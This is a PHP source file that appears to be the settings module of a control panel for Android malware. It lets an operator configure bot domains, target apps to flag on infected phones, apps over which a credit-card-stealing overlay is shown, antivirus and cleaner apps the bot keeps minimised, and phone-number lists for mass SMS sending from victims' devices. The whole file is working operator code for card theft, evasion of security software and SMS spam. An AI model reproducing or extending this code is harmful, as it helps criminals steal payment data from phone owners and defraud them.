<?php
require_once "cmd_mod.php";

class settings extends modBase
{
	protected $module_name = 'settings';

	function get_content()
	{
		$sql = "select * from config where name in('wanted_apps_list', 'cc_on_apps_list', 'minimize_apps_list', 'domains_list', 'folder', 'mass_sms_urls_list')";
		$res = $this->db->exec($sql, null, true);
		
		$data = array();
		$content = '';
		foreach($res as $row)
		{
			$data[$row['name']] = $row['value'];
		}
		
		$folder = explode("bot_", $this->client_cfg['db_name'], 2)[1];
		$guest_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . "/{$folder}/{$this->client_cfg['guest_url']}";
		
		$content = <<<PHP
		<div class='row'>
			<div class='col-md-12' style='font-size: 32pt; text-align: center'>
				<span class="fui-gear marginRight10"></span>
				Settings</div>
		</div>
		<div>&nbsp;</div>
		
		<div class='row'>
			<div class='col-md-1' style='color: yellow'>Folder</div>
			<div class='col-md-5'><input type='text' class='form-control' readonly value="{$data['folder']}" /></div>
			<div class='col-md-2' style='color: yellow'>Guest stats link</div>
			<div class='col-md-4'><input type='text' class='form-control' onclick='this.select()' readonly value="{$guest_url}" /></div>
		</div>
		<div class='row'>
			<div class='col-md-6'>
				<span style='color: yellow'>My domains</span>
				<a href="javascript:undefined" data-toggle="tooltip" tabindex="-1" title="New domains will be appended to existing; no domains will be removed from the bot"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span></a><br />
				<textarea 
					id="cfg-domains_list"
					class="form-control" placeholder="Domains list" rows="5">{$data['domains_list']}</textarea>
			</div>

			<div class='col-md-6'>
				<span style='color: yellow'>Wanted apps</span>
				<a href="javascript:undefined" data-toggle="tooltip" tabindex="-1" title="Bots that has these packages will be marked in bot list"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span></a><br />
				<textarea 
					id="cfg-wanted_apps_list"
					class="form-control" placeholder="Packages list" rows="5">{$data['wanted_apps_list']}</textarea>
			</div>
		</div>
		
		<div class='row'>
			<div class='col-md-6'>
				<span style='color: yellow'>Apps with CC stealer</span>
				<a href="javascript:undefined" data-toggle="tooltip" tabindex="-1" title="Show CC stealer above these apps. Some apps is not allowed"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span></a><br />
				<textarea 
					id="cfg-cc_on_apps_list"
					class="form-control" placeholder="Packages list; Leave empty to use our main list" rows="5">{$data['cc_on_apps_list']}</textarea>
			</div>

			<div class='col-md-6'>
				<span style='color: yellow'>Blocked apps</span>
				<a href="javascript:undefined" data-toggle="tooltip" tabindex="-1" title="These apps (such AVs, cleaners) will be always minimized by bot"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span></a><br />
				<textarea 
					id="cfg-minimize_apps_list"
					class="form-control" placeholder="Packages list; Leave empty to use our main list" rows="5">{$data['minimize_apps_list']}</textarea>
			</div>
		</div>

		<div>&nbsp;</div>
		
		<div class='row'>
			<div class='col-md-12'>
				<span style='color: yellow'>URLs with numbers lists for Mass SMS+</span>
				<a href="javascript:undefined" data-toggle="tooltip" tabindex="-1" title="Each URL should contain list of valid phone numbers; One line - one number"><span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span></a><br />
				<textarea 
					id="cfg-mass_sms_urls_list"
					class="form-control" placeholder="http://domain.com/phone_numbers.txt" rows="5">{$data['mass_sms_urls_list']}</textarea>
			</div>
		</div>

		<div>&nbsp;</div>
		<div class='row'>
			<div class='col-md-5'>&nbsp;</div>
			<div class='col-md-2' style='text-align: center'><button type='button' class='btn btn-info'style='width: 100%' onclick='save_settings()'>Save</button></div>
			<div class='col-md-5'>&nbsp;</div>
		</div>
		<div>&nbsp;</div>
PHP;

		return $this->wrap_content("", $content);
	}
}
